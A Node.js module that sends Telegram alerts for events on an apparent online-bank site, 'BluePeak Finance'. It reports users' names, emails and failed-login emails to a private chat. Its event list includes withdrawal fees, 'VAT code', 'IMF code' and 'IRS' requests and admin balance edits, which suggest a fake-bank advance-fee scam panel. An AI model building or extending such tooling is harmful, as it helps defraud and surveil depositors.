const axios = require('axios');
require('dotenv').config();

const BOT = process.env.TELEGRAM_BOT_TOKEN;
const CHAT = process.env.TELEGRAM_CHAT_ID;

const send = async (msg) => {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      chat_id: CHAT, text: msg, parse_mode: 'HTML',
    });
  } catch (e) { console.error('Telegram error:', e.message); }
};

module.exports = {
  notifyVisit: () => send(`👁 <b>New Visitor</b>\nSomeone visited BluePeak Finance`),
  notifyRegister: (u) => send(`🆕 <b>New Registration</b>\nName: ${u.first_name} ${u.last_name}\nEmail: ${u.email}\nUsername: ${u.username}`),
  notifyLogin: (u) => send(`🔑 <b>Login</b>\n${u.first_name} ${u.last_name} logged in`),
  notifyFailedLogin: (e) => send(`⚠️ <b>Failed Login</b>\nEmail: ${e}`),
  notifyPasswordReset: (e) => send(`🔄 <b>Password Reset</b>\n${e}`),
  notifyDeposit: (u, a, c) => send(`💰 <b>Deposit Request</b>\nUser: ${u.first_name} ${u.last_name}\nAmount: ${c} ${a}`),
  notifyDepositApproved: (u, a, c) => send(`✅ <b>Deposit Approved</b>\n${c} ${a} → ${u.first_name} ${u.last_name}`),
  notifyWithdrawal: (u, a, c) => send(`🏧 <b>Withdrawal Request</b>\nUser: ${u.first_name} ${u.last_name}\nAmount: ${c} ${a}`),
  notifyExchangeFeeRequested: (u) => send(`🔐 <b>Exchange Fee Requested</b>\n${u.first_name} ${u.last_name}`),
  notifyWithdrawalFeeRequested: (u) => send(`🔐 <b>Withdrawal Fee Requested</b>\n${u.first_name} ${u.last_name}`),
  notifyVATRequested: (u) => send(`🔐 <b>VAT Code Requested</b>\n${u.first_name} ${u.last_name}`),
  notifyIMFRequested: (u) => send(`🔐 <b>IMF Code Requested</b>\n${u.first_name} ${u.last_name}`),
  notifyWithdrawalReady: (u, a) => send(`💸 <b>Withdrawal Ready</b>\n${u.first_name} ${u.last_name}\nAmount: ${a}\nAwaiting approval`),
  notifyWithdrawalApproved: (u, a) => send(`✅ <b>Withdrawal Approved</b>\n${a} → ${u.first_name} ${u.last_name}`),
  notifyLocalTransfer: (u, a, r) => send(`💸 <b>Local Transfer</b>\n${u.first_name} ${u.last_name} sent ${a} to ${r}`),
  notifyInternationalTransfer: (u, a, m) => send(`🌍 <b>International Transfer</b>\n${u.first_name} ${u.last_name} — ${a} via ${m}`),
  notifyKYC: (u) => send(`🪪 <b>KYC Submitted</b>\n${u.first_name} ${u.last_name}\nEmail: ${u.email}`),
  notifyKYCApproved: (u) => send(`✅ <b>KYC Approved</b>\n${u.first_name} ${u.last_name}`),
  notifyKYCRejected: (u) => send(`❌ <b>KYC Rejected</b>\n${u.first_name} ${u.last_name}`),
  notifyCardApplication: (u) => send(`💳 <b>Card Application</b>\n${u.first_name} ${u.last_name}`),
  notifyLoan: (u, a, t) => send(`🏦 <b>Loan Application</b>\n${u.first_name} ${u.last_name}\nType: ${t}\nAmount: $${a}`),
  notifyLoanApproved: (u, a) => send(`✅ <b>Loan Approved</b>\n$${a} → ${u.first_name} ${u.last_name}`),
  notifyInvestment: (u, a, p) => send(`📈 <b>New Investment</b>\n${u.first_name} ${u.last_name} invested $${a} in ${p}`),
  notifyInvestmentMatured: (u, a, p) => send(`💹 <b>Investment Matured</b>\n${u.first_name} ${u.last_name} — ${p} — $${a} credited`),
  notifyIRS: (u) => send(`🧾 <b>IRS Request</b>\n${u.first_name} ${u.last_name}`),
  notifyCustomerService: (u, m) => send(`💬 <b>Customer Service</b>\nFrom: ${u.first_name} ${u.last_name}\n${String(m).substring(0, 100)}`),
  notifySupport: (u, m) => send(`🎧 <b>Support Chat</b>\nFrom: ${u.first_name} ${u.last_name}\n${String(m).substring(0, 100)}`),
  notifyTicket: (u, t, p) => send(`🎫 <b>Support Ticket</b>\n${u.first_name} ${u.last_name}\nTitle: ${t}\nPriority: ${p}`),
  notifyFundsAdded: (u, a) => send(`➕ <b>Funds Added</b>\n$${a} → ${u.first_name} ${u.last_name}`),
  notifyFundsRemoved: (u, a) => send(`➖ <b>Funds Removed</b>\n$${a} from ${u.first_name} ${u.last_name}`),
  notifyAccountSuspended: (u) => send(`🚫 <b>Account Suspended</b>\n${u.first_name} ${u.last_name}`),
  notifyAccountActivated: (u) => send(`✅ <b>Account Activated</b>\n${u.first_name} ${u.last_name}`),
};
